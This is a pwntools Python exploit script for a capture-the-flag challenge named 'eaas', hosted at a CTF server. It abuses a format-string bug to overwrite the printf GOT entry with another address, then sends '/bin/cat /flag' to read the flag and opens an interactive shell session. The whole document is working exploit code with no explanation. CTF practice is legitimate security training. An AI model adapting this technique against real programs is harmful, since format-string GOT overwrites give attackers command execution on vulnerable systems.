from pwn import *

context.arch = 'amd64'

elf = context.binary = ELF('./eaas')
p = remote('nc.ctf.unitedctf.ca', 4003)

offset = 10

def send_payload(payload):
    print(payload)
    p.sendline(payload)
    return p.recvline()
    
# printf = 0x402010

fs = FmtStr(execute_fmt=send_payload, offset=10)

fs.write(0x402010, 0x400640)

fs.execute_writes()

info('sending /bin/cat /flag')
p.sendline(b'/bin/cat /flag')

p.interactive()

